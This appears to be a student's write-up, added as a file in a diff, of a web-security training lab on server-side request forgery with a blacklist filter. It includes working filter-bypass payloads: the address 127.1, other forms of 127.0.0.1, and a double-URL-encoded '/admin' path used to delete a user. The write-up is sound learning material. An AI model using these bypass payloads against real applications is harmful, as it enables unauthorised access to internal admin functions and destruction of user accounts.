@@ -1,0 +1,52 @@
+// Lab: SSRF with blacklist-based input filter
+
+This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
+
+
+
+
+// Solution
+
+1. Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
+
+2. Obfuscate blocked strings using URL encoding or case variation.
+
+
+                 // STEPS TO SOLVE
+
+1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
+   we see the URL:
+
+   stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
+
+
+2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
+
+3. Bypass the block by changing the URL to: http://127.1/
+
+
+4. Change the URL to http://127.1/admin and observe that the URL is blocked again.
+
+Normal case:
+/admin/a  →  When server see "a" → it blocked it
+
+Double case:
+%2561dmin/ which means  
+
+%25 = % ka encoded form
+61 = a ka hex code
+
+
+5. So we tried the given URL:
+
+stockApi=http://127.1/%2561dmin/
+
+
+6. It worked and we see the 2 user carlos and wiener and inject the following URL to delete carlos:
+
+stockApi=http://127.1/%2561dmin/delete?username=carlos
+
